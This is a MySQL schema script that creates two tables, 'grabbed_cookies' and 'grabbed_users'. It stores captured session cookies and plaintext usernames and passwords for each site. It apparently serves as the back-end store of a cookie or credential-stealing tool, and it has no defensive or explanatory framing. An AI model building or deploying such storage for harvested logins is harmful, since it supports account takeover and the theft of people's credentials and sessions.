DROP TABLE IF EXISTS grabbed_cookies;
DROP TABLE IF EXISTS grabbed_users;

CREATE TABLE `grabbed_cookies` (
  `id` int(11) NOT NULL,
  `site` varchar(255) DEFAULT NULL,
  `cookiename` varchar(255) DEFAULT NULL,
  `cookie` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE `grabbed_users` (
  `id` int(11) NOT NULL,
  `site` varchar(255) DEFAULT NULL,
  `username` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;


ALTER TABLE `grabbed_cookies`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `grabbed_users`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `grabbed_cookies`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT für Tabelle `grabbed_users`
--
ALTER TABLE `grabbed_users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--